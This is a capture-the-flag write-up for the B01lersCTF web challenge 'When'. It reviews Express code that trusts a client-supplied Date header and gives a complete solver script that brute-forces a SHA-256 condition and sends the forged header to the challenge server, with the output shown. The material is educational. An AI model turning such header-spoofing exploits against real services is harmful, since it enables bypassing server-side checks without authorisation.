+++
date = '2025-04-21T23:11:00+03:00'
draft = false
title = 'B01lersCTF - When (Web)'
+++

## Overview

The challenge is a small Express app in which a user can hit anywhere on the page to "gamble".

## Reviewing the code

After reading `app.ts`, we can see that there is a rate-limiter in place so directly bruteforcing via HTTP is obviously impossible.
There is a `gamble(number)` function that returns a SHA-256, it is used to issue hashes from JavaScript dates.
```js
async function gamble(number: number) {
    return crypto.subtle.digest("SHA-256", Buffer.from(number.toString()))
}
```

Here comes the interesting part, the Express app serves a POST endpoint `/gamble`, which can optionally use a `Date` HTTP header to perform the "calculation". 

Let's see the code:
```js
app.post('/gamble', (req, res) => {
    const time = req.headers.date ? new Date(req.headers.date) : new Date()
    const number = Math.floor(time.getTime() / 1000)
    if (isNaN(number)) {
        res.send({
            success: false,
            error: "Bad Date"
        }).status(400)
        return
    }
    gamble(number).then(data => {
        const bytes = new Uint8Array(data)
        if (bytes[0] == 255 && bytes[1] == 255) {
            res.send({
                success: true,
                result: "1111111111111111",
                flag: "bctf{fake_flag}"
            })
        } else {
            res.send({
                success: true,
                result: bytes[0].toString(2).padStart(8, "0") + bytes[1].toString(2).padStart(8, "0")
            })
        }
    })
});
```

The endpoint computes a SHA-256 hash from the Unix timestamp extracted from the Date header. If the first two bytes of the hash are 255, the server returns the flag.

## Writing an exploit

To pass the backend checks, we need to find a Unix timestamp `T` such that:
```js
Uint8Array(SHA256(T.toString()))[0] === 255
Uint8Array(SHA256(T.toString()))[1] === 255
```
We can brute-force locally since the same logic is used in the backend. Once we find the right value, we send a POST request with a `Date` header set to that exact time.

Here's the full exploit:
```js
import crypto from "crypto";

function gamble(number) {
    return crypto.createHash("sha256").update(number.toString()).digest();
}

function findFF() {
    for (let i = 0; i < 1e8; i++) {
        const hash = gamble(i);
        if (hash[0] === 0xff && hash[1] === 0xff) {
            console.log("Found it:", i);
            return i;
        }
    }
    throw new Error("Not found");
}

const timestamp = findFF();
const time = new Date(timestamp * 1000);

console.log("Timestamp:", timestamp);
console.log("Date:", time.toISOString());

const hash = gamble(timestamp);
console.log("First two bytes:", hash[0], hash[1]);
console.table(Array.from(hash));

const response = await fetch("https://when.atreides.b01lersc.tf/gamble", {
    method: "POST",
    headers: {
        "Date": time.toISOString()
    }
})

const data = await response.json()
console.log(data.flag)
```

In less than a second, it finds the right timestamp and fetches the flag:
```
Found it: 30398
Timestamp: 30398
Date: 1970-01-01T08:26:38.000Z
First two bytes: 255 255
┌─────────┬────────┐
│ (index) │ Values │
├─────────┼────────┤
│ 0       │ 255    │
│ 1       │ 255    │
│ 2       │ 142    │
│ 3       │ 213    │
│ 4       │ 111    │
│ 5       │ 101    │
│ 6       │ 202    │
│ 7       │ 240    │
│ 8       │ 1      │
│ 9       │ 159    │
│ 10      │ 144    │
│ 11      │ 214    │
│ 12      │ 91     │
│ 13      │ 127    │
│ 14      │ 21     │
│ 15      │ 139    │
│ 16      │ 134    │
│ 17      │ 46     │
│ 18      │ 252    │
│ 19      │ 171    │
│ 20      │ 92     │
│ 21      │ 69     │
│ 22      │ 23     │
│ 23      │ 167    │
│ 24      │ 108    │
│ 25      │ 1      │
│ 26      │ 199    │
│ 27      │ 58     │
│ 28      │ 207    │
│ 29      │ 146    │
│ 30      │ 217    │
│ 31      │ 155    │
└─────────┴────────┘
bctf{}
```

## Epilogue
Thanks for reading! Hope you had fun with this challenge.